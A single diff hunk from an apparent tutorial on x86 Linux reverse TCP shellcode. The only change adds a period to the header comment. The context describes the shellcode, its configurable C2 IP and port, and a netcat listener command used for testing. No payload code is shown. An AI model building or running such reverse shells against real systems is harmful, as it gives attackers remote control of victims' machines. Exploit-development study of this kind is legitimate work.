@@ -212,7 +212,7 @@ Here is the full assembly code all pieced up together and prettied up.
 ; Purpose: This is a x86 Linux reverse TCP null-free shellcode.
 ; Usage: ./reverse_tcp_shellcode
 ; Note: The connection attempt is not tuned so run the listener first. The C2 IP and
-; the C2 Port are configurable while assembling with the -D flag(-DC2_IP=0x6801a8c0 -DC2_PORT=0x901f) respectively
+; the C2 Port are configurable while assembling with the -D flag(-DC2_IP=0x6801a8c0 -DC2_PORT=0x901f) respectively.
 ; Compile with:
 ; ./compile.sh reverse_tcp_shellcode
 ; Testing: nc -lnvp 8080
